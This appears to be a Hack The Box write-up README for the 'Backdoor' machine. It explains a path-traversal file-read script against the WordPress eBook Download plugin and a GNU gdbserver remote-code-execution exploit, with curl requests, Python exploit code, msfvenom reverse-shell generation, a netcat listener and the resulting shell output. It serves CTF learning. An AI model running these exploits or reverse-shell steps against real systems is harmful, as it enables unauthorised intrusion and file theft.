# Hack The Box. Machines. Backdoor

Machine write-up: https://7rocky.github.io/en/htb/backdoor

### `dpt.py`

This Python script is used to retrieve files from the machine using a Directory Path Traversal vulnerability found on a Wordpress plugin called `eBook Download`.

Basically, making a GET request to `/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=` and specifying the path to a file will return the contents of that file (if the user that is running the server has enough privileges, for instance, `www-data`).

Using `curl` we can check that it works:

```console
$ curl 'http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/etc/hosts'
/etc/hosts/etc/hosts/etc/hosts127.0.0.1 localhost
127.0.1.1 backdoor

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
<script>window.close()</script>
```

However, we observe that the first and the last line contain some data that can be a little annoying. To avoid this, we can encapsulate the GET request in a simple Python script.

The GET request is performed using `requests` library:

```python
filename = sys.argv[1]
url = f'http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl={filename}'
res = requests.get(url)
```

Notice that the path to the file is specified as a command line argument.

Then, we have the response body in `res.text`. Looking at the `curl` output, we see that the first line is the path to the file repeated three times. And the last line is always `<script>window.close()</script>`.

Using this information, we can easily filter these lines using cool string slicing techniques:

```python
first_line = 3 * filename
last_line = '<script>window.close()</script>'

file = res.text[len(first_line):-len(last_line)].strip()
```

And finally, print the contents of the desired file:

```console
$ python3 dpt.py /etc/hosts
127.0.0.1 localhost
127.0.1.1 backdoor

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

### `pwn_gdbserver.py`

This is a Python exploit to gain Remote Command Execution (RCE) in a GNU gdbserver debugging some binary file that exposes a port. It can also be found in [ExploitDB](https://www.exploit-db.com/exploits/50539) or using `searchsploit`:

```console
$ searchsploit gdbserver
---------------------------------------------------- -----------------------
 Exploit Title                                      | Path
---------------------------------------------------- -----------------------
 GNU gdbserver 9.2 - Remote Command Execution (RCE) | linux/remote/50539.py
---------------------------------------------------- -----------------------
Shellcodes: No Results
```

There is already a Metasploit module (multi/gdb/gdb_server_exec) to obtain RCE over GNU gdbserver.

However, the aim of this Python script is to have a working exploit for GNU gdbserver without the need of using Metasploit (`msfconsole`), for the sake of knowing what the module is doing behind the hood.

I have described how the exploit must be run inside the script:

```plaintext
Usage: python3 pwn-gdbserver.py <gdbserver-ip:port> <path-to-shellcode>

Example:
- Victim's gdbserver   ->  10.10.10.200:1337
- Attacker's listener  ->  10.10.10.100:4444

1. Generate shellcode with msfvenom:
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.100 LPORT=4444 PrependFork=true -o rev.bin

2. Listen with Netcat:
$ nc -nlvp 4444

3. Run the exploit:
$ python3 pwn-gdbserver.py 10.10.10.200:1337 rev.bin
```

First of all, we must generate a shellcode using `msfvenom`, specifying the local IP address and port where `nc` will be listening. Do not forget to use the option `PrependFork=true` and to output the shellcode to a file.

After that, we can set the `nc` listener and run the exploit specifying the remote IP address and port where the GNU gdbserver is running (formatted as `<ip>:<port>`) and the path to the shellcode.

Let's see what the exploit actually does. After some parameter parsing, we connect to the remote GNU gdbserver and call the `exploit` function:

```python
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.connect((ip, int(port)))
    print('[+] Connected to target. Preparing exploit')
    exploit(sock, payload)
    print('[*] Pwned!! Check your listener')
```

Inside the `exploit` function, there are some calls to `send`:

```python
def send(sock, s: str) -> str:
    sock.send(f'${s}#{checksum(s)}'.encode())
    res = sock.recv(1024)
    ack(sock)
    return res.decode()
```

This function just sends data to the remote machine through the socket. GNU gdbserver requires that the data is formatted as `$<data>#<checksum-of-data>`. The `checksum` is a function that sums all bytes of the data and leaves the least significant byte (the output is in hexadecimal format):

```python
def checksum(s: str) -> str:
    res = sum(map(ord, s)) % 256
    return f'{res:2x}'
```

The `ack` function only sends an acknowledgement (ACK) to the remote machine. The GNU gdbserver protocol uses a `+` sign as ACK (more information [here](https://sourceware.org/gdb/current/onlinedocs/gdb/Packet-Acknowledgment.html#Packet-Acknowledgment)).

```python
def ack(sock):
    sock.send(b'+')
```

First of all, we must send to the remote GNU gdbserver what features we support (as if we where using `gdb`). The following ones are enough:

```python
send(sock, 'qSupported:multiprocess+;qRelocInsn+;qvCont+;')
```

Basically, we tell the server that we support multiprocessing, relocating instruction packets and specifying actions (more information [here](https://sourceware.org/gdb/current/onlinedocs/gdb/General-Query-Packets.html#qSupported)).

Next, we must enable the extended mode (more information [here](https://sourceware.org/gdb/current/onlinedocs/gdb/Packets.html#Packets)):

```python
send(sock, '!')
```

After that, we perform a "step" action (more information [here](https://sourceware.org/gdb/current/onlinedocs/gdb/Packets.html#vCont-packet)) and read the response from the server:

```python
try:
    res = send(sock, 'vCont;s')
    data = res.split(';')[2]
    arch, pc = data.split(':')
except Exception:
    print('[!] ERROR: Unexpected response. Try again later')
    exit(1)
```

This response contains data between semi-colons, and the third one contains actually the value of the Instruction Pointer register, indicating the type of architecture as well (mainly x86 and x64).

There were some weird cases where the server did not answer with enough data and an exception was triggered, that is the reason to have the `except` block.

Now we need to differentiate between the two most common architectures. Notice that `10` is 16 in hexadecimal and `08` is 8, which is the size of the registers in number of bits. After that, we must parse the Instrucion Pointer address in Little-Endian and add padding if necessary:

```python
if arch == '10':
    print('[+] Found x64 arch')
    pc = binascii.unhexlify(pc[:pc.index('0*')])
    pc += b'\0' * (8 - len(pc))
    addr = hex(struct.unpack('<Q', pc)[0])[2:]
    addr = '0' * (16 - len(addr)) + addr
elif arch == '08':
    print('[+] Found x86 arch')
    pc = binascii.unhexlify(pc)
    pc += b'\0' * (4 - len(pc))
    addr = hex(struct.unpack('<I', pc)[0])[2:]
    addr = '0' * (8 - len(addr)) + addr
```

Finally, the last step of the exploit is sending the shellcode:

```python
hex_length = hex(len(payload))[2:]

print('[+] Sending payload')
send(sock, f'M{addr},{hex_length}:{payload}')
send(sock, 'vCont;c')
```

To write the shellcode into the binary that is being debugged by GNU gdbserver, we must use an message like `M<address>,<length>:<data>`. This is simple, the address is the Instruction Pointer previously parsed, the length is obviously the length of our payload in hexadecimal and the payload is the `msfvenom` shellcode.

Finally, we send a "continue" acion (more information [here](https://sourceware.org/gdb/current/onlinedocs/gdb/Packets.html#vCont-packet)) and obtain a connection on the `nc` listener because the shellcode is being executed.

More information about GNU gdbserver serial protocol [here](http://davis.lbl.gov/Manuals/GDB/gdb_31.html#SEC630).

This is the process for getting RCE in Backdoor:

```console
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.17.44 LPORT=4444 PrependFork=true -o rev.bin  
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 106 bytes
Saved as: rev.bin

$ python3 pwn-gdbserver.py 10.10.11.125:1337 rev.bin  
[+] Connected to target. Preparing exploit
[+] Found x64 arch
[+] Sending payload
[*] Pwned!! Check your listener
```

```console
$ nc -nlvp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.125.
Ncat: Connection from 10.10.11.125:31367.
whoami
user
hostname
Backdoor
```
